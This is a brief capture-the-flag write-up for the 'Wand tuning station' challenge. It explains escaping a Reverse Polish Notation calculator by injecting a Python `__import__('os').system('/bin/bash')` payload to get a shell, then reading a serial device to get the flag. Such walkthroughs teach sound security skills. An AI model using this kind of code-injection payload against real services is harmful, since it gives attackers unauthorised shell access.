# Writeup [Wand tuning station](README.md)

## Task description

**Points: 300**

**Author: kristebo/PewZ**

**Difficulty: hard**

**Category: AFK** 


## Writeup

When you connect to the box you will be
greeted by a input field and a blinking cursor.
you can input strings formated as _Reverse Polish Notation_.


```
1 2 +
```

And get the answer:

```
 -> 3
 ```

What can we do to get further?
Can we escape this REPL?


```python
1 __import__("os").system("/bin/bash") 2 +
```
Ahh, we got a shell!

The file in the home directory hints that there are devices everywhere.
Looking at `/dev/` we see that there are more serial devices available:
```sh
$ screen /dev/ttyACM0 115200
```

Here you go. We got the flag!

```
TG19{I_UART_U_2}
```
